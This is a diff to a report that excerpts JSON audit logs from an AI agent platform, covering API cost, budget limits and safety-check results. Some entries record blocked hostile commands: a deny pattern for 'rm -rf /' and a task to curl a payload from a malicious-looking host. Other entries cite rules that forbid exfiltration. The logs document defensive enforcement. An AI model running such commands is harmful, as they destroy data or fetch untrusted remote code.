@@ -190,18 +190,21 @@ File: performance_history.json, excerpted metric lines
 
 ### 3) Token/cost accounting and budget enforcement: api_audit.log
 File: api_audit.log
+These are structured JSON entries (not just timestamps). Each line captures the
+event type plus fields like model, cost, token counts, and enforcement reasons.
 ```
+{"timestamp": "2026-02-03T22:41:31.839648", "event": "API_CALL_FAILURE", "user": "admin", "role": "admin", "error": "GROQ_API_KEY not found. Set it via environment variable or pass to constructor.\nGet your key at: https://console.groq.com/keys"}
 {"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
 {"timestamp": "2026-02-03T22:42:06.798752", "event": "CONSTITUTIONAL_VIOLATION", "user": "test_user", "role": "lan", "reason": "LAN users cannot execute requests matching: \\brm\\s+-rf\\s+/", "prompt_hash": "cf2a070fa8c07caa"}
-{"timestamp": "2026-02-03T22:42:10.526871", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.3-70b-versatile", "cost": 0.017758929999999996, "input_tokens": 30049, "output_tokens": 38}
 {"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
 ```
 
 ### 4) Safety policy enforcement: safety_audit.log
 File: safety_audit.log
+Each entry records the task, per-check pass/fail, and the final decision.
 ```
+{"timestamp": "2026-02-03T06:29:42.353702", "task": "Read and analyze grind_spawner.py", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": true, "reason": "Network guard check passed"}, "prompt": {"passed": true, "reason": "Prompt sanitization check passed"}}, "passed": true, "blocked_reason": null}
 {"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
-{"timestamp": "2026-02-03T06:29:42.355417", "task": "Fetch data from https://example.com", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}
 {"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
 ```
 
